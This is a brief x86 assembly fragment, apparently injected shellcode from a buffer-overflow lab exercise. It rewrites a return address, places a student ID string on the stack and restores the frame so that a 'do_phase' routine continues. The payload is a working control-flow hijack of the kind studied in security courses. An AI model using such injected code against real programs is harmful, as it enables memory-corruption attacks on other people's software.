pop    %eax           
add    $0xa,%eax     # change return address
push   $0x3631
push   $0x32313630
push   $0x31333132
mov    %esp,%ecx
push   %ecx          # push the starting address of my id
push   %eax          # push return address
push   %ebp          # original do_phase here
mov    %esp,%ebp



# ASCII
# 2131061216
# HEX
# 32 31 33 31 30 36 31 32 31 36